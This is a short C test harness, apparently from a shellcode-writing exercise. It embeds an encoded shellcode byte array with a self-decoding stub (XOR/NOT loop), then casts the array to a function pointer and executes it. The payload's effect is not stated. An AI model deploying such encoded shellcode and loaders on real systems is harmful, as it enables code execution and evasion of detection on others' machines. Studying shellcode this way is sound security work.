#include <stdio.h>
#include <string.h>

// decoder.nasm shellcode is stored here
unsigned char shellcode[] = \
"\x31\xc9\xb1\x1e\xeb\x0b\x5e\xf6\x16\x80\x36\xaa\x46\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x64\x8e\x06\x3d\x37\x34\x26\x3d\x3d\x37\x3c\x3b\x7a\x3d\x7a\x7a\x7a\x7a\xdc\xb6\x64\x9c\x64\x87\x64\x95\xe5\x5e\x98\xd5";

int main()
{
	// print the length of the shellcode
	printf("Shellcode Length:  %d\n", strlen(shellcode));
	// convert shellcode to a function
	int (*ret)() = (int(*)())shellcode;
	// execute the shellcode has a function
	ret();
}


